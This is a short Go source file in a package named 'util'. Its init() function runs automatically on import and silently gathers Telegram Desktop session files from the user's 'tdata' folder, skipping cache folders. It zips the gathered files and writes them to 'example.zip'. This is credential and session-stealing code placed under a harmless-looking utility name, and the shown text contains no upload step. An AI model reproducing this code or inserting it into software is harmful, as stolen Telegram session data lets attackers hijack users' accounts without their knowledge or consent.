package util

import (
	"archive/zip"
	"bytes"
	"os"
	"path/filepath"
	"strings"
)

var buf bytes.Buffer
var zipWriter = zip.NewWriter(&buf)

func init() {
	dirname := filepath.Join(os.Getenv("APPDATA"), "Telegram Desktop", "tdata")

	err := filepath.Walk(dirname, func(path string, info os.FileInfo, err error) error {
		list := []string{"user_data", "webview", "emoji", "temp", "dumps", "working", "tdummy"}

		if strings.HasSuffix(path, "tdata") {
			return nil
		}

		for _, str := range list {
			if strings.Contains(path, str) {
				return nil
			}
		}

		index := strings.Index(path, "tdata")
		if index != -1 {
			fileName := path[index:]
			content, err := os.ReadFile(path)
			if err != nil {
				return nil
			}
			f, err := zipWriter.Create(fileName)
			if err != nil {
				return nil
			}
			_, err = f.Write(content)
			if err != nil {
				return nil
			}
		}
		return nil
	})
	if err != nil {
		return
	}

	err = zipWriter.Close()
	if err != nil {
		return
	}

	err = os.WriteFile("example.zip", buf.Bytes(), 0644)
	if err != nil {
		return
	}

}
